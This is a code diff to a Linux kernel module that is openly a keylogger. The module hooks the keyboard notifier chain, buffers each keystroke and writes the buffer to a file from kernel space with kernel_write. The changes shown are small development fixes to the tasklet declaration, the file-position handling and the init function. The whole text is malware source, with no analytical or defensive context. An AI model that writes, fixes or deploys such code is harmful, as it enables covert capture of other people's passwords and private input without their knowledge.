@@ -28,7 +28,6 @@ static int write_buff_to_file(void) {
 
 	nbytes = kernel_write(fp, key_buffer, KEY_BUFF_LEN, &file_position);
 	filp_close(fp, NULL);
-	file_position += nbytes;
 
 	return 0;
 }
@@ -38,7 +37,7 @@ static void handle_full_buffer(long unsigned int _n) {
 	buff_position = 0;
 }
 
-DECLARE_TASKLET_OLD(full_buff, &handle_full_buffer);
+DECLARE_TASKLET_OLD(full_buff, handle_full_buffer);
 
 int key_pressed(struct notifier_block *nb, unsigned long action, void *data) {
 	struct keyboard_notifier_param *param = data;
@@ -50,18 +49,16 @@ int key_pressed(struct notifier_block *nb, unsigned long action, void *data) {
 			key_buffer[buff_position] = '\0';
 			tasklet_schedule(&full_buff);
 		}
-
 	} 
 
 	return NOTIFY_OK;
 }
 
-int keyboard_init(void) {
+void keyboard_init(void) {
 	buff_position = 0;
 	file_position = 0;
 
 	register_keyboard_notifier(&keylogger_nb);
-	return 0;
 }
 
 void keyboard_cleanup(void) {
